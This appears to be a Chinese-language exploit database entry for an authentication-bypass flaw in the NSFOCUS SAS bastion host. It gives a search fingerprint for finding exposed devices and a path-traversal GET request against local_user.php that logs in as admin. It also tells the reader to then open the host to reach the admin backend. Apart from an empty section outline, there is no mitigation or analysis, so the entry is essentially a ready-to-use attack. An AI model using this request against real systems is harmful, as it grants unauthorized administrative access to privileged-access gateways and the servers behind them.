# 绿盟SAS堡垒机local_user.php任意用户登录漏洞

- **系统**：绿盟SAS堡垒机local_user.php任意用户登录　|　**类型**：其他　|　**CVE**：—
- **指纹**：`app.name="NSFOCUS 绿盟 SAS"`
- **请求**：`GET /api/virtual/home/status?cat=../../../../../../../../../../../../../../usr/local/nsfocus/web/apache2/www/local_user.php&method=login&user_account=admin HTTP/1.1`

**请求体 / payload**
```
poc访问出现如下页面即可能存在漏洞
Host: xx.xx.xx.xx
Cookie: PHPSESSID=03eea4323452c328c6462f1bb50a0a9b; Hm_lvt_2743f882f7de0bd7d8ffc885a04c90f5=1692345507; Hm_lpvt_2743f882f7de0bd7d8ffc885a04c90f5=1692345507; left_menustatue_NSFOCUSnbspSASH=00https://yzyx.loogear.com/home/status
Sec-Fetch-User: ?1

然后直接访问堡垒机域名即可计入后台
http://xx.xx.xx.xx
```

**其他**
- 绿盟SAS堡垒机local\_user.php任意用户登录漏洞: * 一、漏洞简介
* 二、影响版本
  * 三、资产测绘
* 四、漏洞复现
***
- 版本: * 绿盟SAS堡垒机